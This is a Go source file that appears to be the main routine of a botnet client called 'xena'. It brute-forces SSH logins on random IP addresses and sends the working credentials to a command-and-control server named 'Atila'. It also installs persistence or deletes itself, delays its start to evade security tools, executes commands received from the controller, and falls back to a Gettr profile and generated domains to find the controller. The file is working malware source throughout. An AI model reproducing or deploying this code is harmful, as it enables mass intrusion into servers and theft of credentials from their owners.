package main

import (
	"fmt"
	"math/rand"
	"net"
	"time"
	"xena/config"
	"xena/gateway"
	"xena/helpers"
	"xena/modules"
	"xena/networking"
	"xena/p2p"
	"xena/repository"
	"xena/services"

	"github.com/google/uuid"
)

// Last time since the contact was made with bot herder.
var lastContactMade int = helpers.TimeSinceJesus()

// Does Atila (cnc) knows about us?
var identified bool = false

// sshCrackRoutine is an infinite loop of cracking SSH service.
func sshCrackRoutine(gatewayHost string) {
	for {
		address := networking.IpRandomAddress()
		user := networking.RandomSshUser()
		pass := networking.RandomSshPass()

		err := networking.SshCheck(address, user, pass, 22)
		if err != nil {
			fmt.Println(err)
			continue
		}

		err = gateway.SubmitCreds(gatewayHost, gateway.Creds{
			Ip:   address,
			Port: 22,
			User: user,
			Pass: pass,
		})
		if err != nil {
			fmt.Println(err)
			continue
		}
	}
}

// tick is the content of the main loop. Returns false if something went wrong.
func tick(host string) bool {
	if !identified {
		err := gateway.Identify(host, config.ID, config.PublicIdentificationKey)
		if err != nil {
			fmt.Println(err)
			identified = false
			return false
		}
		identified = true
		return true
	}

	messages, err := gateway.FetchMessages(host, config.ID)
	if err != nil {
		fmt.Println(err)
		return false
	}

	for _, message := range messages {
		reply, err := gateway.InterpretMessage(message)
		if err != nil {
			fmt.Println(err)
			continue
		}

		err = gateway.SendMessage(host, reply)
		if err != nil {
			fmt.Println(err)
			continue
		}

		err = gateway.MessageAck(host, reply.ReplyTo)
		if err != nil {
			fmt.Println(err)
			continue
		}
	}

	return true
}

func initialize() {
	// Check if the bot is persistent within the environment, if not then persist.
	// But only if we're not set to remove the binary up on execution.
	if !config.RemoveSelf {
		if !modules.CheckIfPersisted() {
			err := modules.Persist()
			fmt.Println(err)
		}
	} else {
		err := modules.RemoveBinary()
		if err != nil {
			fmt.Println(err)
		}
	}

	// Initialize a SQLite database and run the migrations.
	err := repository.DB.Init(helpers.RandomPopularWordBySeed(helpers.IntegersFromString(modules.SelfHash)))
	if err != nil {
		fmt.Println(err)
		return
	}

	// Check the database for details about self.
	botDetails, err := repository.DetailsRepo.Get()
	if err != nil {
		fmt.Println(err)
		return
	}

	// Check if we ever saved details about ourselves.
	if len(botDetails.Id) == 0 && len(botDetails.PublicKey) == 0 && len(botDetails.PrivateKey) == 0 {
		// Key-pair used for signing and verifying messages.
		config.PrivateIdentificationKey = modules.GeneratePrivateKey()
		config.PublicIdentificationKey = &config.PrivateIdentificationKey.PublicKey
		// Generate the unique bot identifier.
		config.ID = uuid.New().String()

		// Save into the database.
		repository.DetailsRepo.Insert(config.ID, modules.PrivateKeyToPEM(config.PrivateIdentificationKey), modules.PublicKeyToPEM(config.PublicIdentificationKey))
	} else {
		// Load into global variables bot's details.
		config.PrivateIdentificationKey, err = modules.ImportPEMPrivateKey(botDetails.PrivateKey)
		if err != nil {
			panic(err)
		}
		config.PublicIdentificationKey = modules.ImportPEMPublicKey(botDetails.PublicKey)
		config.ID = botDetails.Id
	}

	// Ignite the SSH cracker.
	if config.EnableSshCracker {
		for i := 0; i < config.SshThreads; i++ {
			go sshCrackRoutine(config.GatewayHost)
		}
	}

	if config.DiscordEnabled {
		var discord = services.Discord{}
		err = discord.Init()
		if err != nil {
			fmt.Println(err)
		}
	}

	// Start the P2P server.
	var p2p p2p.P2P = p2p.P2P{}
	go p2p.BootServer(config.PeerPort)
}

// prepare handles the code executed immediately.
func prepare() {
	// Sleep for a certain amount of time. This way we'll avoid a lot of security solutions.
	// This is insufficient if an environment performs acceleration of the system's sleep call.
	if config.Hybernate {
		rand.Seed(time.Now().UnixNano())
		time.Sleep(time.Minute * time.Duration(rand.Intn(config.HybernateMax-config.HybernateMin)+config.HybernateMax))
	}

	// Calculate hash of itself, so that later we can delete the binary if needed.
	hash, err := modules.HashSelf()
	if err != nil {
		fmt.Println(err)
		panic(err)
	}
	modules.SelfHash = hash
}

func main() {
	// Perform certain actions prior to the execution of duties.
	prepare()

	// Once the bot is started we need to load some variables and prepare it for normal work.
	initialize()

	// Bot's main loop which performs the tick operation. Consider the tick operation the actual content of the main loop.
	for range time.Tick(time.Second * time.Duration(rand.Intn(config.MaxLoopWait-config.MinLoopWait)+config.MaxLoopWait)) {
		rand.Seed(time.Now().UnixNano())

		// We need to reach out to hardcoded host of Atila. (cnc)
		if tick(config.GatewayHost) {
			// Reset the timer of DGA and move on...
			lastContactMade = helpers.TimeSinceJesus()
			continue
		}

		// Reachout to Atila (cnc) host via 'website' property on a Gettr profile.
		if len(config.GettrProfileName) != 0 {
			gettrGatewayHost, err := services.GettrProfileWebsite(config.GettrProfileName)
			if err == nil && len(gettrGatewayHost) != 0 {
				if tick(gettrGatewayHost) {
					// Reset the timer of DGA and move on...
					lastContactMade = helpers.TimeSinceJesus()
					continue
				}
			}
		}

		// Check if DGA should kick it.
		if helpers.TimeSinceJesus()-lastContactMade > config.DgaAfterDays {
			// Try to find the Atila (cnc) behind a generated domain.
			for _, host := range helpers.Dga(config.DgaSeed) {
				if _, err := net.LookupIP(host); err != nil {
					continue
				}
				if tick(host) {
					break
				}
			}
		}
	}
}
